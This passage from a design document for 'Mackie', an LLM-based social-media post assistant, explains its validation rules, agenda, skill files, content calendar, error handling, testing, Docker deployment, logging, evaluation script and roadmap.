| A suggestion with no `source_url` while research sources exist | Not saved: every idea must cite its source. |
| `source_url` that isn't a known research source | Saved, with a warning. |

`record_performance` marks a post `posted` without these checks: by the time results come in, the post is already live. Tools that take a status or a date (`save_post`, `update_post_status`, `search_ledger`) reject a status outside `POST_STATUSES` and a date that isn't `YYYY-MM-DD`, with a message the model can act on. Platforms not defined in `skills/` (e.g. `general`) skip the platform checks. The platform is stored in lowercase, as skill ids are, so "LinkedIn" and "linkedin" are one platform. Research sources typed into an imported profile as plain URLs instead of `{...}` entries are skipped rather than breaking `save_post` and `web_search`.

**Found live.** Applying the rules to ideas made a live run add hashtags to rough suggestions, retry four rejected saves, take 67 seconds over one answer and tell the user "three posts need hashtag fixes". The same run showed a *Visual:* line in every Instagram reply but never saved one, so the visual is now required in code rather than asked for in the prompt.

**Why.** Models miscount characters and don't always follow the tool schema:

- In a live run, a model that was only *warned* about hashtags saved a corrected copy each time, which duplicated six ideas in the ledger.
- A Qwen run invented a `parent_id`.
- A date like "last week" was compared as text and silently matched the wrong posts.

A *wrong* source only gets a warning, because whether a source is good enough is a judgment call. A *missing* one on a suggestion is refused: the live eval found four suggestions whose reply cited a source that never reached the ledger.

**Unsaved suggestions.** Two checks make sure a post shown to the user is in the ledger:

- `research_org`'s result ends with a reminder to save every idea with `save_post` and label it with the returned id. Research comes right before the first suggestions.
- After the final reply, `should_continue` looks for `post_N` ids in it that aren't in the ledger and that the user or a tool didn't mention this turn. If there are any, the `save_check` node adds one follow-up message (named `save_check`, not a user turn) asking the model to save those posts and reply with their real ids. It runs at most once per turn. The first reply is already on screen, so the answer is appended to it; `chat()` returns both.

**Why.** In live evals, both Claude Haiku 4.5 and an OpenCode Zen model went straight from the research result to the suggestions without calling `save_post`, and wrote ledger ids themselves. "The second one" then pointed at a post that didn't exist, and step 7 repeated step 1's ideas because the ledger didn't contain them. The rule was already in the system prompt; a reminder in the tool result is where the model looks next. The id check is a backstop for any model, at the cost of one extra LLM call only when it fires. A reply with numbered ideas and no ids at all isn't caught; detecting that from free text would be guesswork.

### Post results (Optimize)

**What.** `record_performance(post_id, reach?, reactions?, comments?, shares?, clicks?, saves?, note?)` stores the counts the user reports under the post's `performance` key, with `recorded_at`, and sets its status to `posted`. A later report replaces the earlier one, because platforms show running totals. Counts must be whole numbers of zero or more; anything else ("raised $400") goes in `note`. Engagement is the sum of every count except reach (`memory.engagement`). The per-turn prompt lists the five posts with the most engagement, with their platform, pillar and numbers, under "What Performed Best", and the calendar is shown the top three.

**Why.** Maggie's Optimize step ("analyzes performance and suggests what to post next") is what turns a drafting tool into a manager. Without results, "what should we post next?" can only be answered by avoiding repeats. Entering numbers in chat needs no platform accounts and works for email too.

**Trade-offs.** Ranking by raw engagement favors posts with a large reach; an engagement rate needs reach, which users often leave out. Numbers are only as good as what the user types. The next step is importing platform analytics (see Roadmap).

### Agenda: leading with what needs the user

**What.** `memory.agenda(ledger, today)` groups the posts that need the user by next step: drafts awaiting approval, approved posts to publish, `planned` posts due within 7 days (or overdue), and `posted` posts at least 3 days old with no results. A draft or approved post with a newer version on the *same* platform is left out, since that version is the one to act on; a version for another platform, or one the user rejected, doesn't replace it. The groups go into the per-turn prompt as "Needs Attention", at most 5 posts per group with the rest counted, so a backlog can't flood every prompt; and a stable rule tells Mackie to open with them when the user greets it or asks what's next, or else to propose this week's posts. `agenda_summary()` puts the same counts in the web and terminal greetings.

**Why.** Maggie works without prompting and sends deliverables for approval. A chat app can't act between sessions, so Mackie does the next best thing: every session starts with the next step instead of an empty "what would you like to work on?". Computing the agenda in code means the model doesn't have to scan the ledger for overdue items itself.

**Trade-off.** Without a scheduler, nothing happens until someone opens Mackie. Email or Slack reminders driven by the same `agenda()` are the next step (see Roadmap).

### Post formats

**What.** A third skill kind, `kind: format`: feed post, carousel, story and reel ship in `skills/`. Each has a `purpose` (the role it plays), a `structure` the draft follows (slides, frames, a hook and shot list), optional `platforms` (left out for all; an empty list is refused), and optional `has_caption: false`. `save_post` takes a `format`. A format that doesn't exist, or doesn't exist on the post's platform (a LinkedIn story), is not saved. A format without a caption skips the platform's hashtag rule, so an Instagram story isn't refused for lacking 10 hashtags. The calendar picks a format for each post.

**Why.** Vee's own material says "each post type plays a role": feed posts for the lasting record, stories for connection with followers, reels for reach. A caption-only assistant can't produce a story or a reel. Formats are independent of platform and purpose, so "a donation appeal as an Instagram reel" combines three files, and a new format is a new file.

### Skills: platforms, content types, formats and pillars as YAML

**What.** Each `skills/*.yaml` file is one of three kinds:

- **`kind: platform`** (the default): `id`, `name` and `max_length` are required; `tone`, `hashtag_count`, `hashtag_style`, `format_hints` and `needs_visual` (true or false) are optional.
- **`kind: content_type`**: `id`, `name`, `purpose` and `structure` are required; `must_include` and `avoid` are optional.
- **`kind: format`**: `id`, `name`, `purpose` and `structure` are required; `platforms` (a list) and `has_caption` (true or false) are optional.

`skills/content_pillars.yaml` holds the default pillars, and a `content_pillars` list in an org's profile (set through an export and import) overrides them for one org. Everything is loaded on every turn by `agent/skills.py`, so no restart is needed.

**Why.** Platforms and editorial policy are data, not code. One directory and one file format mean there is only one thing to learn.

**Broken files.** Invalid YAML, missing or wrongly typed fields, unknown kinds and duplicate ids are skipped and reported in plain English:

- in the log;
- as a Heads-up at the start of a web chat;
- by `scripts/validate.py`, which exits with code 1.

A broken pillars file (invalid YAML, no `pillars:` list) means no pillars, not a crash, and a pillar without a name is skipped; both are reported the same way.

### Content calendar

**What.** `generate_calendar(month_year, focus?, posts_per_week?)` plans four weeks (days 1–7, 8–14, 15–21, 22–end), with the four LLM calls run in parallel. A `month_year` that isn't "July 2026" or "Jul 2026" is refused with an error the model can fix.

- **Input.** Each call gets the week's dates, the campaign `focus` if given, the platforms and formats from `skills/`, the org's pillars, its brief (wrapped as untrusted) and preferences, its best-performing posts and its recent posts. It is asked for `posts_per_week` posts (default 2, capped at 1–3) on different platforms or formats, tied to an awareness day, giving day or org event in that week where there is one.
- **Output.** Each call replies `{"posts": [...]}` with a date, platform, format, angle, pillar, key date and rationale per post. A bare post object, a list or fenced JSON is also accepted (`_parse_week_plan`), and extra posts are dropped.
- **Repairs.** A platform with no skill file is saved as `general` (an idea for any platform). A format that doesn't exist on the post's platform is cleared (a live plan put emails in `feed_post`). A date outside the week is replaced by the week's first day.
- **Saving.** The posts are saved as `planned` ledger entries with `scheduled_for` (and `key_date`) and returned as a table. A failed week becomes an error row; the other weeks are still saved.

**Why.** Maggie plans "a monthly content calendar aligned with the organization's goals" and "syncs with key calendar dates", and its Starter plan delivers "2 custom posts/week". One call per week, rather than per post, lets the posts within a week differ from each other. Real dates make the plan usable and searchable by `scheduled_for`. Awareness days come from the model's own knowledge, which avoids a dependency on a dates API but can miss local or new ones; the user can correct them in chat. Running the weeks in parallel takes about as long as one call.

**Limitation.** The calendar plans angles; it doesn't write the posts.

### Tool failures become tool results

**What.** `handle_tool_call()` never raises. An exception becomes the tool result `Error: {tool} failed ({ErrorType}); it may work if tried again.` and is traced; its text goes only to the log, since the web UI shows tool results and a driver error's text names the database host. Tool-call JSON is parsed leniently: raw line breaks inside strings are accepted. JSON that still fails (malformed, or cut off) gets `Error: the arguments for {tool} were not valid JSON …`, and the trace keeps the raw text. It used to be parsed as `{}`, so in a live eval a broken `save_post` was told it lacked every argument, which hid the real cause. Required arguments are checked against each tool's schema first, so a call without one gets `Error: save_post needs content; …` instead of a `KeyError`. Optional arguments sent as `null` or `""` count as not given: models often fill every optional argument that way, and `status: ""` was refused while `max_results: null` crashed `web_search`.

**Why.** The tool-call message is checkpointed before the tool runs. A raised exception left that call unanswered, and providers reject every later request in that thread. Returning the error keeps the thread valid and lets the model recover.

**Cut-off replies.** A reply stream that ends at the length limit, or without a finish reason, fails the turn (`graph.ReplyCutOff`) with a message to send it again; what was already streamed stays on screen. A stream a provider cuts off early can't be caught: LiteLLM ends every stream with "stop", and a live run saved "Happy to! It's" as a whole reply that way.

**Lost results.** A turn can still stop between the tool call and its saved result, for example when the database drops its connections at that moment. The thread is then left with an unanswered call, which every provider rejects. Before each model call, `_answer_lost_tool_calls()` gives such a call the result "interrupted; it may or may not have run; check with search_ledger before doing it again", so the conversation carries on and the model doesn't save the post twice.

### Testing

**What.** Every test is offline apart from a local PostgreSQL server: autouse fixtures fail any unmocked LLM call or HTTP request and stub DNS. Each run creates its own database on the server at `TEST_DATABASE_URL`, migrates it as an owner role and runs the tests as an app role, as in production, so row-level security is exercised by every test; the `database` fixture empties it before each test, and a test that reaches the database without that fixture fails. Cross-cutting concerns (security, performance, the UIs, concurrent sessions, errors, logging, deployment settings) have test files of their own, listed with what each owns in CLAUDE.md. Two run outside the main suite:

- **Browser** (`tests/browser/`, opt-in with `pytest -m browser`): the real Chainlit server and frontend in headless Chromium, with a scripted model (`serve.py`) and the run's test database: the login (a wrong password refused), onboarding, an org belonging to another user refused, a reply visible while it is still streaming, a tool step and the ledger after a reload, the layout at phone width (390 px, no sideways scrolling), two users on one org keeping their conversations apart, and images from other sites blocked. It starts a real server, so it is a separate CI job outside the time budget; there `MACKIE_BROWSER_REQUIRED=1` turns a missing Playwright into a failure, not a green job that ran nothing.
- **Deployment** (`tests/deployed/`, opt-in with `pytest -m deployed`, and its own CI job): CI builds and starts the Docker Compose stack from `.env.example` with throwaway secrets, checks that the migration exited cleanly and created the default account, that the app isn't root, that the database isn't published and that the app's role can't bypass row-level security, then logs in with the default account in a browser and onboards an org. No model is called. The Compose file, the init script and the migrate service are checked nowhere else. The job runs under its own Compose project name (`mackie-ci`) and always removes its containers and database volume, even after a failure, so a local run with `act` can't leave a stack behind or reuse a real deployment's volume.

`conftest.py` fails a run that takes more than 30 seconds (not under coverage or for the opt-in tests); CI allows 60 through `MACKIE_TEST_BUDGET_S`, since a shared runner took 28 seconds for a run that takes about 18 to 25 locally. Every test runs against a real database with row-level security (about 0.3 ms per query through Docker); mocking it in most tests would be faster, at the cost of tests that no longer exercise the real policies. The objects LiteLLM, Chainlit and LangGraph create at import are frozen out of the garbage collector after collection (`gc.freeze()`), which saves over a second, and passwords are hashed at a low scrypt cost (`cheap_hashing`). Every setting `.env` defines is blanked and the time zone set to UTC, so a developer's `.env` can't change a run. CI also requires 95% branch coverage.

**Why.** Parallelism is proven with `ConcurrencyProbe`, a stand-in that returns only once N calls are in flight together. A sequential loop times out instead, so a lost `asyncio.gather` fails a test, and no wall-clock timing is involved that could flake on a slow runner. Fuzzing every tool from its schema means a new tool is covered without a new test. Writing these tests found real problems, each now with a regression test: NAT64, IPv4-compatible, percent-encoded and fullwidth hosts passed the SSRF guard; the agenda section had no size limit; `slugify("!!!")` created an org; LLM calls had no timeout; checkpoint storage grew quadratically with conversation length (see Context management); separate processes overwrote each other's posts before the org lock; an import with two posts lacking an id was refused as "duplicate ids"; and Chainlit took Mackie's `DATABASE_URL` as its own chat-history database (hence the `MACKIE_` names).

Streaming and isolation tests use gated streams: a mock model that only produces its next token after an event the test sets. A UI that buffered, or a session that blocked the event loop, deadlocks and fails at a 5-second bound instead of passing slowly. Each test was checked by breaking the code it guards (buffering tokens, removing a timeout or a lock, one shared thread per org) and seeing it fail.

**One owner per behavior.** Each behavior is tested in one place, and a new case extends an existing parametrized test rather than copying it. Overlap is kept only across layers that can break separately: the timeout as a setting and at every call site, and `app.py` with a fake Chainlit and in a real browser.

**Trade-offs.** Coverage instrumentation doubles the run time, so the time budget is skipped under coverage and CI runs the suite twice, plus the browser and deployment jobs. The live behavior of the model is covered only by `scripts/eval.py`, which costs API calls and isn't run in CI.

### Deployment (Docker Compose)

**What.** Three services:

- `postgres`, with no published port; `docker/postgres-init.sh` creates the owner and app roles on first start. Its healthcheck connects over TCP, as the other services do: on first start the image's setup server listens only on its Unix socket, so a socket check could pass before setup finished.
- `migrate`, which runs `scripts/migrate.py` as the owner role, makes sure the default account exists, and exits.
- `mackie`, the web UI, started only once the migration succeeded, and published on `127.0.0.1:8000` only, so plain HTTP never reaches the network around the TLS proxy. It gets only the app role's URL: the superuser, owner and default-account passwords are blanked in its environment. It runs as an unprivileged user who can write only Chainlit's `.files` and `.chainlit/translations`, not the code or `.chainlit/config.toml` (which could otherwise switch on raw HTML or uploads), and `skills/` is mounted read-only.

Compose refuses to start without each password and `CHAINLIT_AUTH_SECRET`, rather than starting a database with an empty password or a web UI whose every login fails.

**Requests.** Uploads are off, but Chainlit's upload endpoint read a 400 MB file into memory before refusing it, and wrote one from a visitor who wasn't logged in to disk. `app.refuse_large_requests` answers that endpoint with 404, and any request over 1 MB, or sent in chunks of unstated length (Chainlit's DELETE routes read a body before checking the login too), before it is read; the README asks the proxy for the same limit.

**Why.** A compromised app process can read and write org rows, within row-level security, but can't change the schema, log in as a more powerful role, or rewrite its own code or settings.

**CI** (`.github/workflows/ci.yml`) runs lint, the tests, coverage, the browser tests and this stack on every push and pull request to `main`. Its token can only read the repository, each job stops after 15–20 minutes rather than GitHub's six hours, and a newer push cancels the run it supersedes. Dependencies are minimum versions, so CI tests the newest releases; ruff alone is pinned exactly, since a new release can change the formatting `ruff format --check` enforces with no change to the code.

### Observability

**What.** Every tool call adds a row with its time, `tool`, `input`, `result_preview` and `latency_ms` to `tool_calls`, under the same row-level security as the rest of the org's data. The web UI shows each tool call as a step.

**Why.** It needs no extra service. Langfuse or Helicone would add cost tracking and dashboards.

**Note.** The trace records tool inputs, including quotes and pasted posts, but never API keys or passwords. It is kept indefinitely; a retention period is a next step if it grows.

**Logs.** Separate from the trace, Mackie writes log lines (`agent/logs.py`) that Docker collects (`docker compose logs mackie`; `PYTHONUNBUFFERED` so none wait in a buffer). Under `chainlit run`, Chainlit already sends the root logger to stdout, so Mackie's lines go there too, once; elsewhere they go to stderr. Each entry point picks its default level (the README lists them), and `MACKIE_LOG_LEVEL` overrides it; `validate.py` prints only its report, since the log would repeat each problem. httpx and LiteLLM, which log every request at INFO (URLs, model calls), are kept to warnings. Each failure is logged once, where it is handled, not again at every layer it passes.

- **What is logged:** logins, refused logins with the reason, lockouts, a refused org, access revoked during a session, account and membership changes; and every failure that is otherwise absorbed so the user can carry on: a tool, a model (and the fallback taken), a summary, the org brief, a calendar week, a page fetch (a refused internal address included), a search, the trace, the database, pruning, a failed turn (with its traceback).
- **What never is:** passwords, API keys, tokens, and what users write. Messages, posts and tool arguments stay in the database. An error is logged as its type and a short message (`describe()`), plus the code frames it passed (`stack()`), never its full text: PostgreSQL's detail and context lines quote the values that failed, which an audit found putting post text in the log. A username that isn't valid isn't logged at all; it may be a password typed in the wrong field. As a second line, `RedactSecrets`, on every handler that writes, masks the value of every environment variable named `*_KEY`, `*_PASSWORD`, `*_SECRET` or `*_TOKEN`, and any connection-string password, in every line and traceback from any library. A log call that is itself wrong is still written rather than raising.
- **Forged lines:** a value a user typed (a username at login, a URL) goes through `safe()`, which escapes newlines and control characters and shortens it, so a username can't write a fake log line.
- **Floods:** a skill-file problem is logged once per process, not on every model call.

**Why.** The failures Mackie absorbs on purpose, so a turn carries on, would otherwise leave no trace for whoever runs it, and who logged in, or was refused, would have no record.

### Evaluation (`scripts/eval.py`)

**What.** The script runs a 7-step acceptance conversation against a real org:

1. Suggest some posts.
2. Write the second one for LinkedIn.
3. Correct the voice to "warm and grassroots".
4. Make an Instagram version.
5. Ask what programs the org runs.
6. Ask which posts we've worked on and their status.
7. Suggest a post for next month.

It then reports three kinds of checks:

- **LLM judge.** Each reply is scored 0–3 on source attribution, voice consistency, and step 7 not repeating step 1: 21 judge calls in parallel. For the repeat check the judge is also shown step 1's reply; without it, the judge was guessing. A failed judge call scores -1 and the others still count. The report totals the scores out of 63; 70% or more (`PASS_PERCENT`) is a pass.
- **Saved data, no LLM.** From snapshots of the profile taken after each step: a preference saved by step 3, step 7 saving posts that aren't copies or versions of step 1's, and a `source_url` on every suggestion.
- **Memory, no judge.** A separate conversation opens with "our Spring Gala is on May 3, remind me the week before", followed by 30 long filler turns stored directly (no API calls), enough to push it out of the window by more than a summary batch. One question then runs live: the summarizer must keep May 3 under the summary's open requests and dates, and the answer must recall it. The unit tests prove what reaches the model; only a real model shows that it uses it.

**Why both.** The judge reads only the replies. In one run it contradicted itself, and nothing showed that the voice correction was never saved. The saved-data checks are exact about what the system learned, but they can't catch a paraphrased repeat; that is the judge's job.

**Judge bias.** Set `JUDGE_MODEL` to a model from another provider, or at least another family, so the judge doesn't grade its own model's work. With only an OpenCode Zen key, use `openai/deepseek-v4-pro` against the assistant's `glm-5.3-flash`: Zen's Claude, GPT and Gemini models reject the Chat Completions path, and DeepSeek V4 Pro, Kimi K3 and MiniMax M3 all answered a judge-style probe in about 2 to 3 seconds. The report names both models. A reasoning judge thinks before answering, so `JUDGE_MAX_TOKENS` is a ceiling, not a target. In 60 DeepSeek V4 Pro calls on real Mackie replies, the old 1,000-token cap left 3 replies empty and cut 1 off, all at `finish_reason=length`. At 4,000 all 60 returned valid JSON, using at most 1,271 tokens (median 143). An empty reply is still asked once more before it scores -1.

---

## Roadmap

| Gap | Today | Next step |
|---|---|---|
| Single sign-on | Password logins and per-org memberships, managed with `scripts/users.py` | Chainlit OAuth (Google, Microsoft) mapped to the same accounts; password reset by email |
| Rate limiting | Per-account login lockout; per-address limits belong to the TLS proxy | Per-org, per-tool counters in PostgreSQL |
| Trace retention | `tool_calls` rows are kept indefinitely | Delete rows older than a set period on a schedule |
| DNS rebinding | Names are checked, then resolved again by httpx | Connect to the checked address |
| Injected preferences | Key, value and quote must use the user's words; lengths are capped | The user confirms each new preference |
| Runtime quality check | The judge runs only in `scripts/eval.py` | A cheap judge call after `save_post` for voice, and a check for near-duplicate ideas |
| Calendar output | Dated angles, saved as `planned` | Draft each entry with the platform rules |
| Publishing and export | `posted` is only a status label | CSV export; Buffer or Hootsuite APIs; then native platform APIs gated on `approved` |
| Analytics | Results are typed into chat (`record_performance`) | Import from the Meta Graph and LinkedIn APIs once publishing connects accounts; engagement rate when reach is known |
| Proactive reminders | The agenda is shown when a session opens | Email or Slack digest from `memory.agenda()` on a schedule |
| Paid promotion | Not supported | Suggest which top performers to boost, with a budget, for the staff to run |
| Research freshness | Refreshed only when asked | Expiry date and a prompt to refresh at session start |
| Org switching | One org per web session | An org switcher that starts a new thread |
| Approval in the UI | Status changes through chat only | Approve and reject buttons on each post |
| Images | A *Visual:* description per Instagram and Facebook draft, saved as `visual` | `litellm.image_generation` from that description, with moderation |
| JavaScript-rendered sites | Little text is extracted | A headless browser as a fallback |
| Long conversations | Older turns survive as a batched summary with its open requests and dates; old tool results are shortened in the window | Retrieve old turns word for word with pgvector |
| Parallel tool calls | Calls in one model reply run one after another, so post ids come out in order | Run read-only tools (search, ledger) together with `asyncio.gather` |
| Role models | A `FAST_MODEL` or `JUDGE_MODEL` identical to a provider's own main model goes to that provider, whatever `*_PROVIDER` says | Pass the provider with each call instead of finding it from the model string |
